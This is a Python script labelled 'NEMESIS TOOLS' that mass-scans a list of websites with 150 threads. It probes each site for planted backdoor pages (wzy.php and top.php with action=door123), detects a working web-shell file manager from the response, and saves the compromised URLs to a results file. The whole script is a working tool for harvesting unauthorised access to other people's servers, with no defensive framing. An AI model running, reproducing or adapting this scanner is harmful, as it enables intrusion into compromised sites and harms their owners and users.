# -*-coding:Latin-1 -*
import sys
import requests
import re
from multiprocessing.dummy import Pool
from colorama import Fore, init

init(autoreset=True)

fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA

print("""

    NEMESIS TOOLS

""")

requests.urllib3.disable_warnings()

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def URLdomain(site):
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    else:
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern, site):
        sitez = re.findall(pattern, site)
        site = sitez[0]
    return site

def ovawzy(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wzy.php?action=door123', headers=headers, timeout=15)

        try:
            decoded_content = check.content.decode('utf-8')
        except UnicodeDecodeError:
            decoded_content = check.content.decode('ISO-8859-1')  

        if "?action=door123&path=/" in decoded_content:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('Results/shell.txt', 'a').write(url + '/wzy.php?action=door123\n')
        else:
            check = requests.get(url+'/top.php?action=door123', headers=headers, timeout=15)

            try:
                decoded_content = check.content.decode('utf-8')
            except UnicodeDecodeError:
                decoded_content = check.content.decode('ISO-8859-1')  

            if "?action=door123&path=/" in decoded_content:
                print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
                open('Results/shell.txt', 'a').write(url + '/top.php?action=door123\n')
            else:
                print(' -| ' + url + ' --> {}[Failed]'.format(fr))
    except Exception as e:
        print(' -| ' + url + ' --> {}[Failed] Exception: Failed'.format(fr, str(e)))


mp = Pool(150)
mp.map(ovawzy, target)
mp.close()
mp.join()

print('\n [!] {}Saved in Results/shell.txt'.format(fc))
